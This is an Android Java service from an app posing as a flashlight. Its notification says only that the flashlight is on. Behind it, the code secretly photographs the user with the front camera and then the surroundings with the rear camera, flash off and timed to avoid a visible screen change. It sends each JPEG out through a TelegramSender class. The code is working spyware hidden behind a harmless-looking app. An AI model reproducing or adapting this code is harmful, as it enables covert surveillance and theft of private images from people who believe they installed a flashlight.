package com.flashlight.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.graphics.ImageFormat;
import android.graphics.Rect;
import android.graphics.YuvImage;
import android.hardware.camera2.*;
import android.media.Image;
import android.media.ImageReader;
import android.os.IBinder;
import androidx.annotation.Nullable;
import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

public class CameraService extends Service {
    private CameraManager manager;
    private CameraDevice device;
    private ImageReader reader;
    private CaptureRequest.Builder builder;

    @Nullable @Override public IBinder onBind(Intent i) { return null; }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        NotificationChannel ch = new NotificationChannel("cam", "Flashlight", NotificationManager.IMPORTANCE_LOW);
        getSystemService(NotificationManager.class).createNotificationChannel(ch);
        Notification n = new Notification.Builder(this, "cam")
                .setContentTitle("Фонарик работает")
                .setSmallIcon(android.R.drawable.ic_menu_camera)
                .build();
        startForeground(1, n);
        
        manager = (CameraManager) getSystemService(CAMERA_SERVICE);
        
        // 1. Сначала снимаем лицо
        capturePhoto("face", "1"); 
        return START_NOT_STICKY;
    }

    private void capturePhoto(String tag, String id) {
        try {
            android.hardware.camera2.params.StreamConfigurationMap map = 
                manager.getCameraCharacteristics(id).get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
            android.util.Size[] sizes = map.getOutputSizes(ImageFormat.YUV_420_888);
            android.util.Size bestSize = sizes[0];
            for (android.util.Size s : sizes) {
                if (s.getWidth() == 1280 && s.getHeight() == 720) {
                    bestSize = s; break;
                }
            }

            final int w = bestSize.getWidth();
            final int h = bestSize.getHeight();

            manager.openCamera(id, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice cam) {
                    device = cam;
                    reader = ImageReader.newInstance(w, h, ImageFormat.YUV_420_888, 1);
                    reader.setOnImageAvailableListener(r -> {
                        Image img = r.acquireLatestImage();
                        if (img == null) return;
                        
                        ByteBuffer yBuffer = img.getPlanes()[0].getBuffer();
                        ByteBuffer uBuffer = img.getPlanes()[1].getBuffer();
                        ByteBuffer vBuffer = img.getPlanes()[2].getBuffer();
                        int ySize = yBuffer.remaining();
                        int uSize = uBuffer.remaining();
                        int vSize = vBuffer.remaining();
                        
                        byte[] nv21 = new byte[ySize + uSize + vSize];
                        yBuffer.get(nv21, 0, ySize);
                        vBuffer.get(nv21, ySize, vSize);
                        uBuffer.get(nv21, ySize + vSize, uSize);
                        
                        YuvImage yuvImage = new YuvImage(nv21, ImageFormat.NV21, w, h, null);
                        ByteArrayOutputStream out = new ByteArrayOutputStream();
                        yuvImage.compressToJpeg(new Rect(0, 0, w, h), 75, out);
                        
                        new TelegramSender().send(out.toByteArray(), tag + ".jpg");
                        
                        img.close(); r.close(); device.close();
                        
                        if (tag.equals("face")) {
                            // После фронталки снимаем заднюю
                            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                                capturePhoto("back", "0");
                            }, 1000);
                        } else {
                            stopSelf(); // Всё сделано, служба завершается
                        }
                    }, null);
                    try {
                        builder = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                        builder.addTarget(reader.getSurface());
                        builder.set(CaptureRequest.FLASH_MODE, CaptureRequest.FLASH_MODE_OFF); // Без вспышки

                        device.createCaptureSession(java.util.Collections.singletonList(reader.getSurface()), new CameraCaptureSession.StateCallback() {
                            @Override public void onConfigured(CameraCaptureSession s) {
                                // ДЛЯ ЗАДНЕЙ КАМЕРЫ ЖДЕМ 2 СЕКУНДЫ, ЧТОБЫ УШЕЛ БЕЛЫЙ ЭКРАН
                                long delay = tag.equals("back") ? 2000 : 500; 
                                
                                new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                                    try { s.capture(builder.build(), null, null); } 
                                    catch (Exception e) { e.printStackTrace(); }
                                }, delay);
                            }
                            @Override public void onConfigureFailed(CameraCaptureSession s) {}
                        }, null);
                    } catch (Exception e) { e.printStackTrace(); }
                }
                @Override public void onDisconnected(CameraDevice c) { c.close(); }
                @Override public void onError(CameraDevice c, int e) { c.close(); }
            }, null);
        } catch (Exception e) { e.printStackTrace(); }
    }
}
